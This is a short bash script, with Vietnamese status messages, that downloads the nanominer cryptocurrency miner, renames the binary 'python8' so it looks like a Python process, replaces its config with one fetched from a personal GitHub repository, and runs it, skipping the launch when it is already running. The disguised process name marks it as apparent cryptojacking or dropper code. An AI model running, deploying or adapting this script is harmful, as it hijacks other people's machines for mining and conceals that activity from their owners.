#! /bin/bash
set -x #echo on
if [ -f ${PWD}/nanominer-linux-1.5.0.tar.gz ]; then
    if pgrep -x "python8" > /dev/null
then
    echo "scrip dang chay roi , ke cmn di "
    
else

echo "script da install , chay thoi "
cd nanominer-linux-1.5.0
./python8
     
fi
exit
fi

wget https://github.com/nanopool/nanominer/releases/download/v1.5.0/nanominer-linux-1.5.0.tar.gz
tar xvzf nanominer-linux-1.5.0.tar.gz
cd nanominer-linux-1.5.0
mv nanominer python8
rm config.ini
wget https://raw.githubusercontent.com/haidanglx/haidanglxx/master/config.ini
chmod +x python8
./python8
